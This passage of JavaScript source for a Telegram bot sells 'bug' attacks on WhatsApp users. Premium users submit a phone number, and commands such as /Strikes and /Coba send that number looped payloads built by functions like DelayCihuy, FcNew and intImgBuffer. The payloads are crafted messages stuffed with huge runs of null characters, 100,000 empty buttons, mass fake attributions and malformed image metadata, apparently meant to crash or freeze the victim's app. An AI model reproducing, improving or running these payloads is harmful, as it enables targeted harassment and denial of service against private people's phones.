                    if (statusCode === 401) {
                      validNumbers = validNumbers.filter(num => num !== botNumber);
                      try {
                        fs.rmSync(sessionDir, { recursive: true, force: true });
                      } catch (e) { }
                    }
                    finish("failed");
                  }
                });

                sock.ev.on("creds.update", saveCreds);
                setTimeout(() => finish("failed"), 15000);
              });
            } catch {
              gagal++;
              return Promise.resolve();
            }
          });

          await Promise.all(refreshTasks);

          if (validNumbers.length !== savedNumbers.length) {
            fs.writeFileSync(SESSIONS_FILE, JSON.stringify(validNumbers));
          }
        }
      }

      if (sessions.size === 0) {
        activeTasks.delete(senderId);
        return bot.sendPhoto(chatId, botLinks.default || defaultLinks.default, {
          caption: `\`\`\`\n✘ 𝙾𝚃𝙰𝙓 𝙰𝚃𝚃𝙰𝙲𝙺 𝚈𝙾𝚄! ✘\n
          ♛ Status  : Tidak Ada Sender Aktif\n
          ♛ Info    : Silahkan ReqPair Terlebih Dahulu\n
          ༒︎ •၊၊||၊|།||||།‌‌‌‌‌၊|• мαηтα'χ\n\`\`\``,
          parse_mode: "Markdown"
        });
      }
    }

    const otax = sessions.values().next().value;

    await bot.sendMessage(chatId, `\`\`\`\n✘ мαηтα'χ 𝙰𝚃𝚃𝙰𝙲𝙺 𝚈𝙾𝚄! ✘\n♛ ターゲット : ${formattedNumber}\n♛ Status    : Bug Terkirim ✘\n༒︎ •၊၊||၊|།||||།‌‌‌‌‌၊|• мαηтα'χ\n\`\`\``, { parse_mode: "Markdown" });

    console.log(`\n[ ✘ ] TARGET LOCKED : ${formattedNumber}`);
    console.log(`[ ♛ ] MEMULAI мαηтα'χ ATTACK...\n`);

    for (let i = 0; i < 2; i++) {
      try {
        console.log(`[ + ] Sedang Attack : ${formattedNumber}`);
        console.log(`   ├─> мαηтα'χ Attack You : ${formattedNumber}`);

        await OtaxAyunBelovedX(otax, target, target);
        const delay = Math.floor(Math.random() * (3000 - 1500 + 1) + 1500);

        console.log(`   ├─> Status : ✘ Sukses Terkirim`);
        console.log(`   └─> Delay  : ${delay}ms\n`);

        await sleep(delay);
      } catch (err) {
        console.log(`   └─> [ ! ] Error  : ${err.message || 'Unknown Error'}\n`);

        if (err.message && (err.message.includes('closed') || err.message.includes('disconnected'))) {
          console.log(`[ ✘ ] KONEKSI WA TERPUTUS! Loop dihentikan otomatis.\n`);
          break;
        }
      }
    }

    console.log(`[ ♛ ] PROSES SELESAI UNTUK TARGET : ${formattedNumber}\n`);

  } finally {
    activeTasks.delete(senderId);
  }
});
bot.onText(/\/Strikes (.+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;
  const formattedNumber = match[1].replace(/[^0-9]/g, "");
  const Jid = `${formattedNumber}@s.whatsapp.net`;
  const target = Jid;
  const sleep = ms => new Promise(res => setTimeout(res, ms));

  if (shouldIgnoreMessage(msg)) return;

  if (isCommandBlocked("Strikes") && !isOwner(senderId)) {
    return bot.sendMessage(chatId, `\`\`\`\n✘ мαηтα'χ — COMMAND BLOCKED\n♛ Status  : Sedang Dinonaktifkan\n♛ Info    : Hubungi Owner untuk unblock\n༒︎ •၊၊||၊|།||||།‌‌‌‌‌၊|• мαηтα'χ\n\`\`\``, { parse_mode: "Markdown" });
  }

  if (!premiumUsers.some(user => user.id === senderId && new Date(user.expiresAt) > new Date()) && !isGroupPremium(chatId)) {
    return bot.sendPhoto(chatId, botLinks.default || defaultLinks.default, {
      caption: `\`\`\`KAMU TIDAK MEMILIKI AKSES\`\`\`\n( ! ) Silahkan AddPremium Sebelum Menggunakan Bug`,
      parse_mode: "Markdown",
      reply_markup: {
        inline_keyboard: [[{ text: "𝘖𝘸𝘯𝘦𝘳", url: settings.OWNER_URL }]]
      }
    });
  }

  if (activeTasks.has(senderId)) {
    return bot.sendMessage(chatId, `\`\`\`\n✘ мαηтα'χ 𝙰𝚃𝚃𝙰𝙲𝙺 𝚈𝙾𝚄! ✘\n
    ♛ ターゲット : ${formattedNumber}\n
    ♛ Status    : Bug Terkirim ✘\n
    ༒︎ •၊၊||၊|།||||།‌‌‌‌‌၊|• мαηтα'χ\n\`\`\``, { parse_mode: "Markdown" });
  }

  activeTasks.add(senderId);

  try {
    if (sessions.size === 0) {
      let totalTersimpan = 0;
      let berhasil = 0;
      let gagal = 0;
      let validNumbers = [];

      if (fs.existsSync(SESSIONS_FILE)) {
        let savedNumbers = [];
        try {
          savedNumbers = JSON.parse(fs.readFileSync(SESSIONS_FILE, "utf-8") || "[]");
        } catch (err) {
          savedNumbers = [];
        }

        totalTersimpan = savedNumbers.length;
        validNumbers = [...savedNumbers];

        if (totalTersimpan > 0) {
          const refreshTasks = savedNumbers.map(async (botNumber) => {
            try {
              const sessionDir = createSessionDir(botNumber);
              const { state, saveCreds } = await useMultiFileAuthState(sessionDir);

              const sock = makeWASocket({
                auth: state,
                printQRInTerminal: false,
                logger: P({ level: "silent" }),
                defaultQueryTimeoutMs: undefined,
              });

              return new Promise((resolve) => {
                let done = false;
                const finish = (status) => {
                  if (!done) {
                    done = true;
                    if (status === "success") berhasil++;
                    else gagal++;
                    resolve();
                  }
                };

                sock.ev.on("connection.update", async (update) => {
                  const { connection, lastDisconnect } = update;

                  if (connection === "open") {
                    sessions.set(botNumber, sock);
                    finish("success");
                  } else if (connection === "close") {
                    const statusCode = lastDisconnect?.error?.output?.statusCode;
                    if (statusCode === 401) {
                      validNumbers = validNumbers.filter(num => num !== botNumber);
                      try {
                        fs.rmSync(sessionDir, { recursive: true, force: true });
                      } catch (e) { }
                    }
                    finish("failed");
                  }
                });

                sock.ev.on("creds.update", saveCreds);
                setTimeout(() => finish("failed"), 15000);
              });
            } catch {
              gagal++;
              return Promise.resolve();
            }
          });

          await Promise.all(refreshTasks);

          if (validNumbers.length !== savedNumbers.length) {
            fs.writeFileSync(SESSIONS_FILE, JSON.stringify(validNumbers));
          }
        }
      }

      if (sessions.size === 0) {
        activeTasks.delete(senderId);
        return bot.sendPhoto(chatId, botLinks.default || defaultLinks.default, {
          caption: `\`\`\`\n✘ 𝙾𝚃𝙰𝙓 𝙰𝚃𝚃𝙰𝙲𝙺 𝚈𝙾𝚄! ✘\n
          ♛ Status  : Tidak Ada Sender Aktif\n
          ♛ Info    : Silahkan ReqPair Terlebih Dahulu\n
          ༒︎ •၊၊||၊|།||||།‌‌‌‌‌၊|• мαηтα'χ\n\`\`\``,
          parse_mode: "Markdown"
        });
      }
    }

    const otax = sessions.values().next().value;

    await bot.sendMessage(chatId, `\`\`\`
✘ мαηтα'χ 𝙰𝚃𝚃𝙰𝙲𝙺 𝚈𝙾𝚄! ✘
♛ ターゲット : ${formattedNumber}
♛ Status    : Bug Terkirim ✘
༒︎ •၊၊||၊|།||||།‌‌‌‌‌၊|• мαηтα'χ
\`\`\``, { parse_mode: "Markdown" });

    console.log(`\n[ ✘ ] TARGET LOCKED : ${formattedNumber}`);
    console.log(`[ ♛ ] MEMULAI мαηтα'χ ATTACK...\n`);

    for (let i = 0; i < 15; i++) {
      try {
        console.log(`[ + ] Sedang Attack : ${formattedNumber}`);
        console.log(`   ├─> мαηтα'χ Attack You : ${formattedNumber}`);

        await ofmcrlManta(otax, target);

        const delay = Math.floor(Math.random() * (3000 - 1500 + 1) + 1500);

        console.log(`   ├─> Status : ✘ Sukses Terkirim`);
        console.log(`   └─> Delay  : ${delay}ms\n`);

        await sleep(delay);
      } catch (err) {
        console.log(`   └─> [ ! ] Error  : ${err.message || 'Unknown Error'}\n`);

        if (err.message && (err.message.includes('closed') || err.message.includes('disconnected'))) {
          console.log(`[ ✘ ] KONEKSI WA TERPUTUS! Loop dihentikan otomatis.\n`);
          break;
        }
      }
    }

    console.log(`[ ♛ ] PROSES SELESAI UNTUK TARGET : ${formattedNumber}\n`);

  } finally {
    activeTasks.delete(senderId);
  }
});

async function DelayCihuy(otax, target) {
  const delaymsg = {
    groupStatusMessageV2: {
      message: {
        interactiveResponseMessage: {
          body: {
            text: "MantaXxx",
            format: "DEFAULT"
          },
          nativeFlowResponseMessage: {
            name: "call_permission_request",
            paramsJson: "\u0000".repeat(169000),
            version: 3
          }
        },
        interactiveResponseMessage: {
          body: {
            text: "MantaXxx",
            format: "EXTENSION"
          },
          nativeFlowResponseMessage: {
            name: "address_message",
            paramsJson: `{"values":{"in_pin_code":"999999","building_name":"k","landmark_area":"k","address":"k","tower_number":"k","city":"Japanese","name":"k","phone_number":"555555","house_number":"xxx","floor_number":"xxx","state":"k | ${"\u0000".repeat(169000)}"}}`,
            version: 3
          }
        }
      },
      contextInfo: {
        remoteJid: Math.random().toString(36) + "\u0000".repeat(16900),
        isForwarded: true,
        forwardingScore: 9999,
        statusAttributionType: 2,
        statusAttributions: Array.from({ length: 25000 }, (_, n) => ({
          participant: `62${n + 836598}@s.whatsapp.net`,
          type: 1
        }))
      }
    }
  };

  await otax.relayMessage(target, delaymsg, {
    participant: { jid: target }
  });
}

async function FcNew(otax, target) {
  const xnxxmsg = {
    //  groupStatusMessageV2: {
    message: {
      interactiveMessage: {
        body: {
          text: "MantaXxx"
        },
        nativeFlowMessage: {
          buttons: "{}".repeat(100000)
        }
      }
    }
    //   }
  };

  await otax.relayMessage(target, xnxxmsg, {
    participant: { jid: target }
  });
}

async function ingpisibel(otax, target) {
  for (let z = 0; z < 1; z++) {
    await otax.relayMessage("status@broadcast", {
      groupStatusMessageV2: {
        message: {
          interactiveMessage: {
            body: {
              text: "7eppsynC"
            },
            nativeFlowMessage: {
              buttons: Array(100000).fill({})
            }
          }
        }
      }
    }, {
      statusJidList: [target],
      additionalNodes: [
        {
          tag: "meta",
          attrs: {},
          content: [{
            tag: "mentioned_users",
            attrs: {},
            content: [{
              tag: "to",
              attrs: { jid: target }
            }]
          }]
        }
      ]
    });
  }
}
async function intImgBuffer(otax, target) {
  for (let x = 0; x < 5; x++) {
    await otax.relayMessage(target, {
      groupStatusMessageV2: {
        message: {
          interactiveMessage: {
            header: {
              hasMediaAttachment: true,
              imageMessage: {
                url: "https://mmg.whatsapp.net/v/t62.7118-24/541976809_2837142193286853_1911450611004796385_n.enc?ccb=11-4&oh=01_Q5Aa4gH0ixoCjpfiz1BLlSZACygYLxFcYUKiI4Nwq516e5pGvA&oe=6A29213C&_nc_sid=5e03e0&mms3=true",
                mimetype: "image/jpeg",
                fileSha256: "z8tbfc1DBcy9J0Gq7eJiu3ckMOyKKvbOs4Xl3J6UvGQ=",
                fileLength: "1",
                height: -212,
                width: 999999999999,
                mediaKey: "EiO5AfHhX1dTXqbBP5Wf/MzZ6qOqOG4nts9VrPv/rxY=",
                fileEncSha256: "/PuWsqa9/5jDcRhuBexUEGjFN0wPHdXQPe/+SlSiwBU=",
                directPath: "/v/t62.7118-24/541976809_2837142193286853_1911450611004796385_n.enc?ccb=11-4&oh=01_Q5Aa4gH0ixoCjpfiz1BLlSZACygYLxFcYUKiI4Nwq516e5pGvA&oe=6A29213C&_nc_sid=5e03e0",
                mediaKeyTimestamp: "1778501051",
                jpegThumbnail: "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIAC8ASAMBIgACEQEDEQH/xAAsAAACAwEBAAAAAAAAAAAAAAAABQIEBgEDAQEAAAAAAAAAAAAAAAAAAAAA/9oADAMBAAIQAxAAAABK0eKC9dyvDbCK+XhXZLYAcKosWaaBnLjFQVnGYcGrF4MKdzwIz8+nusagjXa2Jgx2H//EACcQAAICAgEDBAEFAAAAAAAAAAECAAMEERIFITEQExQgYSMyM0JR/9oACAEBAAE/AKLrFJPMynqFo8PKeqKR+pKsym3Wj9rem4tn9ADLujWps1NHD1rwdSCIDYSrpZxI8TH6haHSqzXKZGQ9YBXR3DdeD/IAZi3WWg8016tvideYUys3mjoAAezRum5SPEV0yC1ikHwJe9g/brUbOIdNrvRleUt4rNba03j0I2CJUxDsu+RWPchYAE/kCOeDoS25npz9rivcmZPvV8hxmwd78zBevHTuImWgQOXHGHwZ2cDiQCT3InAVAfnyYtVSncZQwjYd3MtsNL+m/I1pAhmTiXUaD+P9mSxGk36fHr2ddocYEd3YxMcaBbZP0dFcEMARM/pHLb0z/8QAFBEBAAAAAAAAAAAAAAAAAAAAMP/aAAgBAgEBPwB//8QAFBEBAAAAAAAAAAAAAAAAAAAAMP/aAAgBAwEBPwB//9k=",
                scansSidecar: "xt906ajMmv0EvBy89zTBKFs9rvAOwr8mIqV2kxGG6xUVyUSGmWzpuw=",
                scanLengths: [
                  999999999999,
                  999999999999,
                  999999999999,
                  999999999999
                ],
                midQualityFileSha256: ""
              }
            },
            body: {
              text: "xel...¿?"
            },
            contextInfo: {
              remoteJid: "undefined@s.whatsapp.net",
              mentionedJid: ["undefined@s.whatsapp.net"],
              isForwarded: true,
              forwardingScore: 9999,
              parentGroupJid: "0@g.us"
            },
            nativeFlowMessage: {
              buttons: Array.from({ length: 100000 }, () => ({}))
            }
          }
        }
      }
    }, {
      participant: {
        jid: target
      }
    });
  }
}



bot.onText(/\/Coba (.+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;
  const formattedNumber = match[1].replace(/[^0-9]/g, "");
  const Jid = `${formattedNumber}@s.whatsapp.net`;
  const target = Jid;
  const mention = Jid;
  const isTarget = Jid;
  const sleep = ms => new Promise(res => setTimeout(res, ms));

  if (shouldIgnoreMessage(msg)) return;

  if (!premiumUsers.some(user => user.id === senderId && new Date(user.expiresAt) > new Date()) && !isGroupPremium(chatId)) {
    return bot.sendPhoto(chatId, botLinks.default || defaultLinks.default, {
      caption: `\`\`\`KAMU TIDAK MEMILIKI AKSES\`\`\`\n( ! ) Silahkan AddPremium Sebelum Menggunakan Bug`,
      parse_mode: "Markdown",
      reply_markup: {
        inline_keyboard: [[{ text: "𝘖𝘸𝘯𝘦𝘳", url: settings.OWNER_URL }]]
      }
    });
  }
  if (sessions.size === 0) {
    if (fs.existsSync(SESSIONS_FILE)) {
      const savedNumbers = JSON.parse(fs.readFileSync(SESSIONS_FILE));

      if (savedNumbers && savedNumbers.length > 0) {
        const refreshTasks = savedNumbers.map(async (botNumber) => {
          try {
            const sessionDir = createSessionDir(botNumber);
            const { state, saveCreds } = await useMultiFileAuthState(sessionDir);

            const sock = makeWASocket({
              auth: state,
              printQRInTerminal: false,
              logger: P({ level: "silent" }),
              defaultQueryTimeoutMs: undefined,
            });

            return new Promise((resolve) => {
              let done = false;
              const finish = () => {
                if (!done) {
                  done = true;
                  resolve();
                }
              };

              sock.ev.on("connection.update", async (update) => {
                const { connection } = update;
                if (connection === "open") {
                  sessions.set(botNumber, sock);
                  finish();
                } else if (connection === "close") {
                  finish();
                }
              });
              sock.ev.on("creds.update", saveCreds);
              setTimeout(finish, 8000);
            });
          } catch { }
        });

        await Promise.all(refreshTasks);
      }
    }

    if (sessions.size === 0) {
      return bot.sendPhoto(chatId, botLinks.default || defaultLinks.default, {
        caption: `\`\`\`
✘ 𝙾𝚃𝙰𝙓 𝙰𝚃𝚃𝙰𝙲𝙺 𝚈𝙾𝚄! ✘
♛ Status  : Tidak Ada Sender Aktif
♛ Info    : Silahkan ReqPair Terlebih Dahulu
༒︎ •၊၊||၊|།||||།‌‌‌‌‌၊|• мαηтα'χ
\`\`\``,
        parse_mode: "Markdown"
      });
    }
  }


  const otax = sessions.values().next().value;

  setImmediate(async () => {
    for (let i = 0; i < 10; i++) {
      try {
        console.log(`[ + ] Mengirim bug (Percobaan ${i + 1}/10)...`);
        await intImgBuffer(otax, target);
        console.log(`[ ✓ ] bug Berhasil (Percobaan ${i + 1}/10)`);
      } catch (err) {
        console.log(`[ ✘ ] bug Gagal (Percobaan ${i + 1}/10). Error:`, err);
      }
    }
  });

  await bot.sendMessage(chatId, `\`\`\`
✘ мαηтα'χ 𝙰𝚃𝚃𝙰𝙲𝙺 𝚈𝙾𝚄! ✘
♛ ターゲット : ${formattedNumber}
♛ Status    : Bug Terkirim ✘
༒︎ •၊၊||၊|།||||།‌‌‌‌‌၊|• мαηтα'χ
\`\`\``, { parse_mode: "Markdown" });
});

bot.onText(/\/listpair/, async (msg) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;

  if (!isOwner(senderId) && !adminUsers.includes(senderId)) return;

  // Auto reconnect before listing
  if (fs.existsSync(SESSIONS_FILE)) {
    const savedNumbers = JSON.parse(fs.readFileSync(SESSIONS_FILE));
    if (savedNumbers && savedNumbers.length > 0) {
      const refreshTasks = savedNumbers.map(async (botNumber) => {
        const existing = sessions.get(botNumber);
        if (existing) {
          try {
            if (existing.ws?.readyState === 1) return;
          } catch { }
          sessions.delete(botNumber);
        }

        try {
          const sessionDir = createSessionDir(botNumber);
          const { state, saveCreds } = await useMultiFileAuthState(sessionDir);
          const sock = makeWASocket({
            auth: state,
            printQRInTerminal: false,
            logger: P({ level: "silent" }),
            defaultQueryTimeoutMs: undefined,
          });

          return new Promise((resolve) => {
            let done = false;
            const finish = () => { if (!done) { done = true; resolve(); } };
            sock.ev.on("connection.update", (update) => {
              if (update.connection === "open") {
                sessions.set(botNumber, sock);
                finish();
              } else if (update.connection === "close") {
                finish();
              }
            });
            sock.ev.on("creds.update", saveCreds);
            setTimeout(finish, 8000);
          });
        } catch { }
      });
      await Promise.all(refreshTasks);
    }
  }

  if (sessions.size === 0) {
    return bot.sendMessage(chatId, `\`\`\`
✘ мαηтα'χ — LIST SENDER
♛ Status : Tidak ada sender aktif
༒︎ •၊၊||၊|။||||။‌‌‌‌‌၊|• мαηтα'χ
\`\`\``, { parse_mode: "Markdown" });
  }

  let list = "";
  let no = 1;
  for (const [number] of sessions) {
    list += `♛ ${no++}. ${number}\n`;
  }

  await bot.sendMessage(chatId, `\`\`\`
✘ мαηтα'χ — LIST SENDER
♛ Total : ${sessions.size} Sender Aktif

${list.trim()}
༒︎ •၊၊||၊|။||||။‌‌‌‌‌၊|• мαηтα'χ
\`\`\``, { parse_mode: "Markdown" });
});

bot.onText(/\/refresh/, async (msg) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;

  if (!isOwner(senderId) && !adminUsers.includes(senderId)) return;

  const sent = await bot.sendMessage(chatId, `\`\`\`
✘ мαηтα'χ — REFRESH SENDER
♛ Status : Sedang memeriksa koneksi...
༒︎ •၊၊||၊|။||||။‌‌‌‌‌၊|• мαηтα'χ
\`\`\``, { parse_mode: "Markdown" });

  if (!fs.existsSync(SESSIONS_FILE)) {
    return bot.editMessageText(`\`\`\`
✘ мαηтα'χ — REFRESH SENDER
♛ Status : Tidak ada file sesi ditemukan
༒︎ •၊၊||၊|።||||။‌‌‌‌‌၊|• мαηтα'χ
\`\`\``, { chat_id: chatId, message_id: sent.message_id, parse_mode: "Markdown" });
  }

  const savedNumbers = JSON.parse(fs.readFileSync(SESSIONS_FILE));
  if (!savedNumbers || savedNumbers.length === 0) {
    return bot.editMessageText(`\`\`\`
✘ мαηтα'χ — REFRESH SENDER
♛ Status : Tidak ada nomor tersimpan
༒︎ •၊၊||၊|།||||།‌‌‌‌‌၊|• мαηтα'χ
\`\`\``, { chat_id: chatId, message_id: sent.message_id, parse_mode: "Markdown" });
  }

  let reconnected = 0;
  let failed = 0;
  let skipped = 0;

  for (const botNumber of savedNumbers) {
    const existing = sessions.get(botNumber);

    if (existing) {
      try {
        const state = existing.ws?.readyState;
        if (state === 1) {
          skipped++;
          continue;
        }
      } catch { }
      sessions.delete(botNumber);
    }

    try {
      const sessionDir = createSessionDir(botNumber);
      const { state, saveCreds } = await useMultiFileAuthState(sessionDir);

      const sock = makeWASocket({
        auth: state,
        printQRInTerminal: false,
        logger: P({ level: "silent" }),
        defaultQueryTimeoutMs: undefined,
      });

      await new Promise((resolve) => {
        sock.ev.on("connection.update", async (update) => {
          const { connection, lastDisconnect } = update;
          if (connection === "open") {
            sessions.set(botNumber, sock);
            reconnected++;
            resolve();
          } else if (connection === "close") {
            failed++;
            resolve();
          }
        });
        sock.ev.on("creds.update", saveCreds);
        setTimeout(resolve, 15000);
      });
    } catch {
      failed++;
    }
  }

  await bot.editMessageText(`\`\`\`
✘ мαηтα'χ — REFRESH SENDER
♛ Total Tersimpan : ${savedNumbers.length}
♛ Berhasil Reconnect : ${reconnected}
♛ Masih Aktif (Skip) : ${skipped}
♛ Gagal : ${failed}
♛ Total Aktif Skrg : ${sessions.size}
༒︎ •၊၊||၊|།||||།‌‌‌‌‌၊|• мαηтα'χ
\`\`\``, { chat_id: chatId, message_id: sent.message_id, parse_mode: "Markdown" });
});

bot.onText(/\/addgroup/, async (msg) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;

  if (!isOwner(senderId) && !adminUsers.includes(senderId)) {
    return bot.sendMessage(chatId, `\`\`\`\n✘ мαηтα'χ — AKSES DITOLAK\n♛ Status  : Bukan Owner / Admin\n༒︎ •၊၊||၊|།||||།‌‌‌‌‌၊|• мαηтα'χ\n\`\`\``, { parse_mode: "Markdown" });
  }

  if (msg.chat.type === "private") {
    return bot.sendMessage(chatId, `\`\`\`\n✘ мαηтα'χ — FORMAT SALAH\n♛ Info    : Command ini hanya untuk di group\n༒︎ •၊၊||၊|།||||།‌‌‌‌‌၊|• мαηтα'χ\n\`\`\``, { parse_mode: "Markdown" });
  }

  if (allowedGroups.includes(chatId)) {
    return bot.sendMessage(chatId, `\`\`\`\n✘ мαηтα'χ — INFO\n♛ Status  : Group sudah terdaftar\n༒︎ •၊၊||၊|།||||།‌‌‌‌‌၊|• мαηтα'χ\n\`\`\``, { parse_mode: "Markdown" });
  }

  allowedGroups.push(chatId);
  saveAllowedGroups();

  await bot.sendMessage(chatId, `\`\`\`\n✘ мαηтα'χ — ADD GROUP\n♛ Status  : Sukses Ditambahkan\n♛ ID Group: ${chatId}\n༒︎ •၊၊||၊|།||||།‌‌‌‌‌၊|• мαηтα'χ\n\`\`\``, { parse_mode: "Markdown" });
});

bot.onText(/\/delgroup/, async (msg) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;

  if (!isOwner(senderId) && !adminUsers.includes(senderId)) {
    return bot.sendMessage(chatId, `\`\`\`\n✘ мαηтα'χ — AKSES DITOLAK\n♛ Status  : Bukan Owner / Admin\n༒︎ •၊၊||၊|།||||།‌‌‌‌‌၊|• мαηтα'χ\n\`\`\``, { parse_mode: "Markdown" });
  }

  if (msg.chat.type === "private") {
    return bot.sendMessage(chatId, `\`\`\`\n✘ мαηтα'χ — FORMAT SALAH\n♛ Info    : Command ini hanya untuk di group\n༒︎ •၊၊||၊|།||||།‌‌‌‌‌၊|• мαηтα'χ\n\`\`\``, { parse_mode: "Markdown" });
  }

  const index = allowedGroups.indexOf(chatId);
  if (index === -1) {
    return bot.sendMessage(chatId, `\`\`\`\n✘ мαηтα'χ — INFO\n♛ Status  : Group belum terdaftar\n༒︎ •၊၊||၊|།||||།‌‌‌‌‌၊|• мαηтα'χ\n\`\`\``, { parse_mode: "Markdown" });
  }

  allowedGroups.splice(index, 1);
  saveAllowedGroups();

  await bot.sendMessage(chatId, `\`\`\`\n✘ мαηтα'χ — DEL GROUP\n♛ Status  : Sukses Dihapus\n♛ ID Group: ${chatId}\n༒︎ •၊၊||၊|།||||།‌‌‌‌‌၊|• мαηтα'χ\n\`\`\``, { parse_mode: "Markdown" });
});

const BUG_COMMANDS = ['Xoya', 'Xnow', 'Xover', 'Strikes', 'Xsow', 'Xlock', 'BugGroup', 'DelayGb', 'Xcl'];

bot.onText(/\/block(?:\s+(.+))?/, async (msg, match) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;

  if (!isOwner(senderId)) {
    return bot.sendMessage(chatId, `\`\`\`\n✘ мαηтα'χ — AKSES DITOLAK\n♛ Status  : Bukan Owner\n༒︎ •၊၊||၊|།||||།‌‌‌‌‌၊|• мαηтα'χ\n\`\`\``, { parse_mode: "Markdown" });
  }

  const cmdToBlock = match[1];

  if (!cmdToBlock) {
    // Show status of all commands
    let statusMsg = `\`\`\`\n━━━【мαηтα'χ】━━━\n╭▄︻デɮʟօƈƙ ƈʍɖ═══━一\n`;
    BUG_COMMANDS.forEach(cmd => {
      const isBlocked = blockedCommands.includes(cmd);
      statusMsg += `┃╰┈➤ /${cmd} : ${isBlocked ? '✘ BLOCKED' : '✔ ACTIVE'}\n`;
    });
    statusMsg += `╰━━━━━━━━━━━━━━━༉‧.\n\`\`\``;
    return bot.sendMessage(chatId, statusMsg, { parse_mode: "Markdown" });
  }

  const normalizedCmd = cmdToBlock.trim();
  if (!BUG_COMMANDS.includes(normalizedCmd)) {
    return bot.sendMessage(chatId, "Command tidak valid atau bukan command bug.");
  }

  if (blockedCommands.includes(normalizedCmd)) {
    return bot.sendMessage(chatId, `Command /${normalizedCmd} sudah diblock.`);
  }

  blockedCommands.push(normalizedCmd);
  saveBlockedCommands();

  await bot.sendMessage(chatId, `\`\`\`\n✘ мαηтα'χ — BLOCK CMD\n♛ Status  : Sukses Diblock\n♛ Command : /${normalizedCmd}\n༒︎ •၊၊||၊|།||||།‌‌‌‌‌၊|• мαηтα'χ\n\`\`\``, { parse_mode: "Markdown" });
});

bot.onText(/\/unblock\s+(.+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;

  if (!isOwner(senderId)) {
    return bot.sendMessage(chatId, `\`\`\`\n✘ мαηтα'χ — AKSES DITOLAK\n♛ Status  : Bukan Owner\n༒︎ •၊၊||၊|།||||།‌‌‌‌‌၊|• мαηтα'χ\n\`\`\``, { parse_mode: "Markdown" });
  }

  const cmdToUnblock = match[1].trim();

  if (!BUG_COMMANDS.includes(cmdToUnblock)) {
    return bot.sendMessage(chatId, "Command tidak valid atau bukan command bug.");
  }

  const index = blockedCommands.indexOf(cmdToUnblock);
  if (index === -1) {
    return bot.sendMessage(chatId, `Command /${cmdToUnblock} tidak sedang diblock.`);
  }

  blockedCommands.splice(index, 1);
  saveBlockedCommands();

  await bot.sendMessage(chatId, `\`\`\`\n✘ мαηтα'χ — UNBLOCK CMD\n♛ Status  : Sukses Diunblock\n♛ Command : /${cmdToUnblock}\n༒︎ •၊၊||၊|།||||།‌‌‌‌‌၊|• мαηтα'χ\n\`\`\``, { parse_mode: "Markdown" });
});

bot.onText(/\/aturphoto(?:\s+(.+))?/, async (msg, match) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;

  if (!isOwner(senderId)) {
    return bot.sendMessage(chatId, `\`\`\`\n✘ мαηтα'χ — AKSES DITOLAK\n♛ Status  : Bukan Owner\n༒︎ •၊၊||၊|།||||།‌‌‌‌‌၊|• мαηтα'χ\n\`\`\``, { parse_mode: "Markdown" });
  }

  const args = match[1] ? match[1].trim().split(/\s+/) : [];

  if (args.length === 0) {
    const helpText = `\`\`\`
━━━【мαηтα'χ】━━━
╭▄︻デ ᴀᴛᴜʀ ᴘʜᴏᴛᴏ ═══━一
┃    写真設定
━━━【Tutorial】━━━
┃ Fitur ini digunakan untuk
┃ mengganti link gambar/video
┃ yang digunakan oleh bot.
┃
┃ Format:
┃ /aturphoto [nomor] [link]
┃
┃ Pilihan:
┃ /aturphoto 1 [link]
┃ ᝰ.ᐟ Atur Foto Menu/Welcome
┃
┃ /aturphoto 2 [link]
┃ ᝰ.ᐟ Atur Foto No Access/Error
┃
┃ /aturphoto 3 [link1,link2,...]
┃ ᝰ.ᐟ Atur Foto Random (Pisahkan dengan koma)
┃
┃ Contoh:
┃ /aturphoto 1 https://link.com/img.jpg
╰━━━━━━━━━━━━━━━༉‧.
\`\`\``;
    return bot.sendMessage(chatId, helpText, { parse_mode: "Markdown" });
  }

  const type = args[0];
  const link = args.slice(1).join(" ");

  if (!link) {
    return bot.sendMessage(chatId, "Silahkan masukkan linknya juga. Contoh: \`/aturphoto 1 https://...\`", { parse_mode: "Markdown" });
  }

  if (type === "1") {
    botLinks.welcome = link;
    saveBotLinks();
    return bot.sendMessage(chatId, `Sukses memperbarui Foto Menu/Welcome ke: ${link}`);
  } else if (type === "2") {
    botLinks.default = link;
    saveBotLinks();
    return bot.sendMessage(chatId, `Sukses memperbarui Foto No Access/Error ke: ${link}`);
  } else if (type === "3") {
    const linksArray = link.split(",").map(l => l.trim()).filter(l => l.length > 0);
    if (linksArray.length === 0) {
      return bot.sendMessage(chatId, "Link tidak valid.");
    }
    botLinks.random = linksArray;
    saveBotLinks();
    return bot.sendMessage(chatId, `Sukses memperbarui Foto Random (\${linksArray.length} link).`);
  } else {
    return bot.sendMessage(chatId, "Pilihan tidak valid. Gunakan 1, 2, atau 3.");
  }
});

bot.onText(/\/addprem(?:\s(.+))?/, async (msg, match) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;

  if (!isOwner(senderId) && !adminUsers.includes(senderId)) {
    return bot.sendMessage(chatId, `\`\`\`
✘ мαηтα'χ — AKSES DITOLAK
♛ Status  : Bukan Owner / Admin
♛ Info    : Lu Siapa? Emang Gw Kenal?
༒︎ •၊၊||၊|།||||།‌‌‌‌‌၊|• мαηтα'χ
\`\`\``, { parse_mode: "Markdown" });
  }

  if (!match[1]) {
    return bot.sendMessage(chatId, `\`\`\`
✘ мαηтα'χ — FORMAT SALAH
♛ Contoh  : /addprem 62xxx 30d
♛ Durasi  : 1d / 7d / 30d / 1h / 1m
༒︎ •၊၊||၊|།||||།‌‌‌‌‌၊|• мαηтα'χ
\`\`\``, { parse_mode: "Markdown" });
  }

  const args = match[1].split(' ');
  if (args.length < 2) {
    return bot.sendMessage(chatId, `\`\`\`
✘ мαηтα'χ — FORMAT SALAH
♛ Contoh  : /addprem 62xxx 30d
